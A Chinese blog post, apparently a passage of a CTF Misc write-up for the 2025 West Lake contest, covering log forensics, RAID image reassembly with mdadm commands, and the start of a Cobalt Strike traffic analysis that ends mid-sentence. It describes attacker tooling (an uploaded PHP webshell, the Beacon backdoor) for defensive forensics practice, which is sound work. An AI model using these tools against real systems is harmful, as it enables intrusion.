<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=2"><meta name=robots content="noodp"><title>2025 西湖论剑·中国杭州网络安全技能大赛 Misc Writeup - ⚡Lunatic BLOG⚡</title><meta name=author content="Lunatic"><meta name=description content="最近这一段时间一直被科研和毕设上的事拖着，因此就有段时间没有做Misc题了
趁着写毕设没啥思路和动力的功夫，来稍微复盘下今年西湖论剑的题
"><meta name=keywords content='CTF,Misc,Writeup'><meta itemprop=name content="2025 西湖论剑·中国杭州网络安全技能大赛 Misc Writeup"><meta itemprop=description content="最近这一段时间一直被科研和毕设上的事拖着，因此就有段时间没有做Misc题了
趁着写毕设没啥思路和动力的功夫，来稍微复盘下今年西湖论剑的题"><meta itemprop=datePublished content="2025-04-19T15:35:37+08:00"><meta itemprop=dateModified content="2025-04-19T15:35:37+08:00"><meta itemprop=wordCount content="4003"><meta itemprop=keywords content="CTF,Misc,Writeup"><meta property="og:url" content="https://goodlunatic.github.io/posts/f002407/"><meta property="og:site_name" content="⚡Lunatic BLOG⚡"><meta property="og:title" content="2025 西湖论剑·中国杭州网络安全技能大赛 Misc Writeup"><meta property="og:description" content="最近这一段时间一直被科研和毕设上的事拖着，因此就有段时间没有做Misc题了
趁着写毕设没啥思路和动力的功夫，来稍微复盘下今年西湖论剑的题"><meta property="og:locale" content="zh_CN"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-04-19T15:35:37+08:00"><meta property="article:modified_time" content="2025-04-19T15:35:37+08:00"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Misc"><meta property="article:tag" content="Writeup"><meta name=twitter:card content="summary"><meta name=twitter:title content="2025 西湖论剑·中国杭州网络安全技能大赛 Misc Writeup"><meta name=twitter:description content="最近这一段时间一直被科研和毕设上的事拖着，因此就有段时间没有做Misc题了
趁着写毕设没啥思路和动力的功夫，来稍微复盘下今年西湖论剑的题"><meta name=application-name content="FixIt"><meta name=apple-mobile-web-app-title content="FixIt"><meta name=theme-color data-light=#f8f8f8 data-dark=#252627 content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel=icon href=https://www.nssctf.cn/files/2024/4/28/7f130a1387.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical type=text/html href=https://goodlunatic.github.io/posts/f002407/ title="2025 西湖论剑·中国杭州网络安全技能大赛 Misc Writeup - ⚡Lunatic BLOG⚡"><link rel=prev type=text/html href=https://goodlunatic.github.io/posts/754b8e7/ title="2025 XCTF国际网络攻防联赛-SUCTF分站赛 Misc Writeup"><link rel=next type=text/html href=https://goodlunatic.github.io/posts/c49ae8a/ title=CTF-数据安全><link rel=alternate type=text/markdown href=https://goodlunatic.github.io/posts/f002407/index.md title="2025 西湖论剑·中国杭州网络安全技能大赛 Misc Writeup - ⚡Lunatic BLOG⚡"><link rel=stylesheet href=/css/config.min.css><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"2025 西湖论剑·中国杭州网络安全技能大赛 Misc Writeup","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/goodlunatic.github.io\/posts\/f002407\/"},"genre":"posts","keywords":"CTF, Misc, Writeup","wordcount":4003,"url":"https:\/\/goodlunatic.github.io\/posts\/f002407\/","datePublished":"2025-04-19T15:35:37+08:00","dateModified":"2025-04-19T15:35:37+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Lunatic"},"description":""}</script><script src=/js/head/color-scheme.min.js></script></head><body data-header-desktop=sticky data-header-mobile=auto><div class=wrapper data-page-style=normal><header class="desktop animate__faster" id=header-desktop><div class=header-wrapper data-github-corner=left><div class=header-title><a href=/ title="⚡Lunatic BLOG⚡"><span class=header-title-text>⚡Lunatic BLOG⚡</span></a><span class=header-subtitle></span></div><nav><ul class=menu><li class=menu-item><a class=menu-link href=/collections/><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden=true></i> 合集</a></li><li class=menu-item><a class=menu-link href=/archives/><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden=true></i> 归档</a></li><li class=menu-item><a class=menu-link href=/categories/><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden=true></i> 分类</a></li><li class=menu-item><a class=menu-link href=/tags/><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden=true></i> 标签</a></li><li class=menu-item><a class=menu-link href=/friends/><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden=true></i> 友链</a></li><li class=menu-item><a class=menu-link href=/about/><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden=true></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id=search-desktop><input type=text placeholder=搜索文章标题或内容…… id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fa-solid fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-desktop><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></li><li class="menu-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></li></ul></nav></div></header><header class="mobile animate__faster" id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="⚡Lunatic BLOG⚡"><span class=header-title-text>⚡Lunatic BLOG⚡</span></a><span class=header-subtitle></span></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><nav><ul class=menu id=menu-mobile><li class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容…… id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fa-solid fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-mobile><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></li><li class=menu-item><a class=menu-link href=/collections/><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden=true></i> 合集</a></li><li class=menu-item><a class=menu-link href=/archives/><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden=true></i> 归档</a></li><li class=menu-item><a class=menu-link href=/categories/><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden=true></i> 分类</a></li><li class=menu-item><a class=menu-link href=/tags/><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden=true></i> 标签</a></li><li class=menu-item><a class=menu-link href=/friends/><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden=true></i> 友链</a></li><li class=menu-item><a class=menu-link href=/about/><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden=true></i> 关于</a></li><li class="menu-item menu-system"><span class="menu-system-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></span></li></ul></nav></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=fi-container><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label=合集><div class="details related-details open"><div class="details-summary related-summary"><i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden=true></i>
<span class=related-title>相关内容</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class="details-content related-content"><ul class=related-list><li class=related-item><a href=/posts/7bf9cb0/ title="2024 国城杯网络安全挑战赛 Misc Writeup">2024 国城杯网络安全挑战赛 Misc Writeup</a></li><li class=related-item><a href=/posts/754b8e7/ title="2025 XCTF国际网络攻防联赛-SUCTF分站赛 Misc Writeup">2025 XCTF国际网络攻防联赛-SUCTF分站赛 Misc Writeup</a></li><li class=related-item><a href=/posts/de8e2be/ title="2024 强网拟态防御国际精英挑战赛初赛 Misc Writeup">2024 强网拟态防御国际精英挑战赛初赛 Misc Writeup</a></li><li class=related-item><a href=/posts/1a285be/ title="2024 网鼎杯网络安全大赛青龙组 Misc Writeup">2024 网鼎杯网络安全大赛青龙组 Misc Writeup</a></li><li class=related-item><a href=/posts/c216d58/ title="2024 浙江省大学生网络与信息安全竞赛 Misc Writeup">2024 浙江省大学生网络与信息安全竞赛 Misc Writeup</a></li></ul></div></div><div class=aside-custom><a href target=_blank rel=external><img src=/images/zsxq.webp alt="Lunatic Planet QR code" width=100%></a></div></aside><article class="page single"><div class=header><h1 class="single-title animate__animated animate__flipInX"><span>2025 西湖论剑·中国杭州网络安全技能大赛 Misc Writeup</span></h1></div><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://goodlunatic.github.io title=作者 target=_blank rel="external nofollow noopener noreferrer author" class=author><img class=avatar src=https://www.nssctf.cn/files/2024/4/28/7f130a1387.png alt=Lunatic height=16 width=16>&nbsp;Lunatic</a></span><span class=post-included-in>&nbsp;收录于 <a href=/categories/writeup/ class=post-category title="分类 - Writeup"><i class="fa-regular fa-folder fa-fw" aria-hidden=true></i> Writeup</a></span></div><div class=post-meta-line><span title="发布于 2025-04-19 15:35:37"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden=true></i><time datetime=2025-04-19>2025-04-19</time></span>&nbsp;<span title="4003 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden=true></i>约 4100 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden=true></i>预计阅读 19 分钟</span>&nbsp;<span id=busuanzi_container_page_pv class="busuanzi_visitors comment-visitors" data-flag-title="2025 西湖论剑·中国杭州网络安全技能大赛 Misc Writeup"><i class="fa-regular fa-eye fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_page_pv>-</span>&nbsp;次阅读
</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept=false><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fa-solid fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#线上初赛>线上初赛</a><ul><li><a href=#题目名称-easydatalog>题目名称 easydatalog</a></li><li><a href=#题目名称-糟糕的磁盘>题目名称 糟糕的磁盘</a><ul><li><a href=#方法一ufs直接重组>方法一：(UFS直接重组)</a></li><li><a href=#方法二在ubuntu下用losetup和mdadm进行组装挂载>方法二：在Ubuntu下用losetup和mdadm进行组装挂载</a></li></ul></li><li><a href=#题目名称-dsasignaturedata>题目名称 DSASignatureData</a></li><li><a href=#题面名称-easyrawencode>题面名称 easyrawencode</a></li><li><a href=#题目名称-cscs>题目名称 cscs</a></li></ul></li><li><a href=#线下决赛>线下决赛</a><ul><li><a href=#题目名称-只留清白在人间>题目名称 只留清白在人间</a></li><li><a href=#题目名称-icewater>题目名称 IceWater</a></li><li><a href=#题目名称-并非乱ping>题目名称 并非乱ping</a></li><li><a href=#题目名称-steganography_challenges03>题目名称 Steganography_challenges0.3</a></li></ul></li></ul></nav></div></div><div class=content id=content><p><strong>最近这一段时间一直被科研和毕设上的事拖着，因此就有段时间没有做Misc题了</strong></p><p><strong>趁着写毕设没啥思路和动力的功夫，来稍微复盘下今年西湖论剑的题</strong></p><table><thead><tr><th style=text-align:center><img loading=lazy src=/posts/f002407/imgs/image-20250118233839169.png alt=/posts/f002407/imgs/image-20250118233839169.png height=608 width=1080><br><br></th></tr></thead><tbody><tr><td style=text-align:center>本文中涉及的具体题目附件可以进我的交流群获取，进群详见 <a href=https://goodlunatic.github.io/about/ target=_blank rel="external nofollow noopener noreferrer">About</a></td></tr></tbody></table><h2 class=heading-element id=线上初赛><span>线上初赛</span>
<a href=#%e7%ba%bf%e4%b8%8a%e5%88%9d%e8%b5%9b class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=题目名称-easydatalog><span>题目名称 easydatalog</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-easydatalog class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><blockquote><p>题面信息如下：
请你对附件中的日志文件进行分析，找出“张三”的身份证号和手机号，譬如其身份证号是119795199308186673，手机号是73628276413，则提交的flag为“119795199308186673_73628276413”。</p></blockquote><p>题目附件给了 access.log 和 error.log 两个日志文件</p><p>简单翻看后，我们重点关注error.log，发现传了一个PHP的Webshell</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250118234608767.png alt=/posts/f002407/imgs/image-20250118234608767.png height=1528 width=2560></p><p>继续翻看日志文件，可以发现出题人传了一个压缩包还有一个JPG图片</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250118234928372.png alt=/posts/f002407/imgs/image-20250118234928372.png height=1528 width=2560></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250118234945856.png alt=/posts/f002407/imgs/image-20250118234945856.png height=1528 width=2560></p><p>由于是分段传输，因此我们手动删除每段间的无效数据，把这两个文件提取出来</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250118235554420.jpeg alt=/posts/f002407/imgs/image-20250118235554420.jpeg height=512 width=512></p><p>发现压缩包是加密的，里面有个data.csv，因此猜测需要从那张JPG图片中得到解压密码</p><p>经过尝试，发现JPG图片是盲水印隐写，直接用工具提取即可</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250118235248538.png alt=/posts/f002407/imgs/image-20250118235248538.png height=789 width=1139></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250118235359515.png alt=/posts/f002407/imgs/image-20250118235359515.png height=1164 width=1509></p><p>使用得到的密码解压压缩包即可得到张三的信息，即flag：<code>DASCTF{30601319731003117X_79159498824}</code></p><h3 class=heading-element id=题目名称-糟糕的磁盘><span>题目名称 糟糕的磁盘</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e7%b3%9f%e7%b3%95%e7%9a%84%e7%a3%81%e7%9b%98 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>题目附件给了五个img文件，查看后发现是Linux下RAID格式的磁盘文件</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250228162745234.png alt=/posts/f002407/imgs/image-20250228162745234.png height=241 width=2010></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250228162829496.png alt=/posts/f002407/imgs/image-20250228162829496.png height=605 width=1127></p><p>压缩包注释中也给了提示：<code>I only remember the block size is 512KB</code></p><h4 class=heading-element id=方法一ufs直接重组><span>方法一：(UFS直接重组)</span>
<a href=#%e6%96%b9%e6%b3%95%e4%b8%80ufs%e7%9b%b4%e6%8e%a5%e9%87%8d%e7%bb%84 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>软件下载链接：<a href=https://cangshui.net/5257.html target=_blank rel="external nofollow noopener noreferrer">UFS Explorer Professional Recovery 9.18</a></p><p>直接用UFS打开五个img文件即可，软件会自动重组，然后点击最下面那个kali</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250228162941848.png alt=/posts/f002407/imgs/image-20250228162941848.png height=772 width=1202></p><p>发现里面有一张<code>key.png</code>和一个<code>secret</code>文件，其中<code>secret</code>文件大小为10MB</p><p>因此猜测是VC创建的加密镜像，密钥就是<code>key.png</code></p><p>尝试使用<code>key.png</code>作为密钥挂载，挂载成功后得到<code>flag.txt</code></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250228163404243.png alt=/posts/f002407/imgs/image-20250228163404243.png height=487 width=565></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250228163328475.png alt=/posts/f002407/imgs/image-20250228163328475.png height=487 width=565></p><p>打开即可得到flag：<code>DASCTF{R41D_4ND_D15K_M4573R}</code></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250228163309963.png alt=/posts/f002407/imgs/image-20250228163309963.png height=775 width=1183></p><h4 class=heading-element id=方法二在ubuntu下用losetup和mdadm进行组装挂载><span>方法二：在Ubuntu下用losetup和mdadm进行组装挂载</span>
<a href=#%e6%96%b9%e6%b3%95%e4%ba%8c%e5%9c%a8ubuntu%e4%b8%8b%e7%94%a8losetup%e5%92%8cmdadm%e8%bf%9b%e8%a1%8c%e7%bb%84%e8%a3%85%e6%8c%82%e8%bd%bd class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>在WSL2(Ubuntu20.04)中运行一下命令即可成功挂载</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo losetup -fP m8X4exzG.img  <span class=c1># 绑定第一个镜像文件到一个空闲的 loop 设备，并解析其分区表</span>
</span></span><span class=line><span class=cl>sudo losetup -fP Fsiq6lKn.img
</span></span><span class=line><span class=cl>sudo losetup -fP gSoNiXLC.img
</span></span><span class=line><span class=cl>sudo losetup -fP suPVGqm6.img
</span></span><span class=line><span class=cl>sudo losetup -fP uGZ85OzT.img
</span></span><span class=line><span class=cl>sudo losetup -a  <span class=c1># 查看当前所有已绑定的 loop 设备及其对应的文件</span>
</span></span><span class=line><span class=cl>cat /proc/mdstat  <span class=c1># 查看当前系统中已组装的 RAID 设备状态</span>
</span></span><span class=line><span class=cl>sudo mount /dev/md127 tmp  <span class=c1># 挂载 RAID 设备 md127 到 tmp 目录，尝试访问其内容</span>
</span></span><span class=line><span class=cl>ls -al tmp
</span></span><span class=line><span class=cl>sudo umount tmp  <span class=c1># 卸载 tmp 目录，释放 md127 设备的挂载</span>
</span></span><span class=line><span class=cl>sudo mdadm --stop /dev/md127  <span class=c1># 停止 RAID 设备 md127，释放相关 loop 设备的占用</span>
</span></span><span class=line><span class=cl>sudo losetup -d /dev/loop0  <span class=c1># 解除 loop0 设备的绑定</span>
</span></span><span class=line><span class=cl>sudo losetup -d /dev/loop1
</span></span><span class=line><span class=cl>sudo losetup -d /dev/loop2
</span></span><span class=line><span class=cl>sudo losetup -d /dev/loop3
</span></span><span class=line><span class=cl>sudo losetup -d /dev/loop4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 检查 /dev/loop0 至 /dev/loop4 上的每个设备的 RAID 元数据（查看设备是否是 RAID 阵列的一部分）</span>
</span></span><span class=line><span class=cl>sudo mdadm --examine /dev/loop0 /dev/loop1 /dev/loop2 /dev/loop3 /dev/loop4   
</span></span><span class=line><span class=cl><span class=c1># 创建一个名为 /dev/md127 的 RAID 0 阵列，包含 5 个设备（/dev/loop0 至 /dev/loop4）</span>
</span></span><span class=line><span class=cl>sudo mdadm --create /dev/md127 --level<span class=o>=</span><span class=m>0</span> --raid-devices<span class=o>=</span><span class=m>5</span> /dev/loop0 /dev/loop1 /dev/loop2 /dev/loop3 /dev/loop4   </span></span></code></pre></td></tr></table></div></div><blockquote><p>Tips:这里我的WSL2可能启用了 <code>mdadm</code> 的 <strong>自动检测和组装</strong>，因此会在发现 <code>RAID</code> 元数据时自动创建 <code>/dev/md127</code></p></blockquote><p><img loading=lazy src=/posts/f002407/imgs/image-20250302105806686.png alt=/posts/f002407/imgs/image-20250302105806686.png height=927 width=1734></p><p>但是当我尝试在kali上执行以上操作的时候，它不会自动识别 <code>RAID</code> 阵列并自动挂载</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250302111821199.png alt=/posts/f002407/imgs/image-20250302111821199.png height=1539 width=2561></p><p>因此还是建议在Ubuntu系统下进行以上操作</p><h3 class=heading-element id=题目名称-dsasignaturedata><span>题目名称 DSASignatureData</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-dsasignaturedata class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><blockquote><p>题面信息如下：
请你对附件中的流量文件进行分析，在该流量里有一些个人信息数据。附件中还有一份个人信息的签名数据 data-sign.csv（其中签名算法采用 DSA，哈希算法采用 SHA256）和一组公钥文件（位于 public 文件夹中，文件名格式为 public-XXXX.pem，其中 XXXX 为 userid 左侧补零至四位数，即个人用户对应的公钥文件）。由于数据可能在传输过程中被篡改过，因此需要你进行签名验证，验证数据是否被篡改。找出被篡改过的个人信息数据并保存到新的 csv 文件中（文件编码 utf-8，文件格式和 data.csv 保持一致），并将该文件上传至该题的校验平台（在该校验平台里可以下载该题的示例文件 example.csv，可作为该题的格式参考），校验达标即可拿到 flag。</p></blockquote><h3 class=heading-element id=题面名称-easyrawencode><span>题面名称 easyrawencode</span>
<a href=#%e9%a2%98%e9%9d%a2%e5%90%8d%e7%a7%b0-easyrawencode class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><h3 class=heading-element id=题目名称-cscs><span>题目名称 cscs</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-cscs class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>题目附件给了一个流量包，稍微翻看了一下发现主要是HTTP流量</p><p>然后结合题目的名称已经流量包中的特征<code>submit.php</code>以及心跳包，可以知道是CobalStrike流量分析</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250226234433708.png alt=/posts/f002407/imgs/image-20250226234433708.png height=1528 width=2560></p><p>但是这题和之前遇见的常规的CS流量直接给java序列化后的密钥对文件不同，这题它给了我们 Beacon</p><blockquote><p>在 Cobalt Strike 中，Beacon 是一种后门 payload，旨在提供持续的访问控制和通信通道。它被植入目标系统后，能够通过多种隐蔽的通信方式（如 HTTP/HTTPS）与攻击者的控制服务器进行定期的交互，执行命令、获取敏感信息并保持持久化。这使得 Beacon 成为渗透测试和红队操作中用于维持长期控制、获取系统信息和横向移动的重要工具。</p></blockquote><p><img loading=lazy src=/posts/f002407/imgs/image-20250226235242533.png alt=/posts/f002407/imgs/image-20250226235242533.png height=1300 width=1786></p><p>然后去网上找相关的文章，可以找到下面这些文章：</p><p><a href=https://www.freebuf.com/articles/system/327060.html target=_blank rel="external nofollow noopener noreferrer">https://www.freebuf.com/articles/system/327060.html</a></p><p><a href=https://www.freebuf.com/articles/network/407982.html target=_blank rel="external nofollow noopener noreferrer">https://www.freebuf.com/articles/network/407982.html</a></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250226235541882.jpeg alt=/posts/f002407/imgs/image-20250226235541882.jpeg height=350 width=690></p><p>从文章中我们可以知道 <code>mB9u</code> 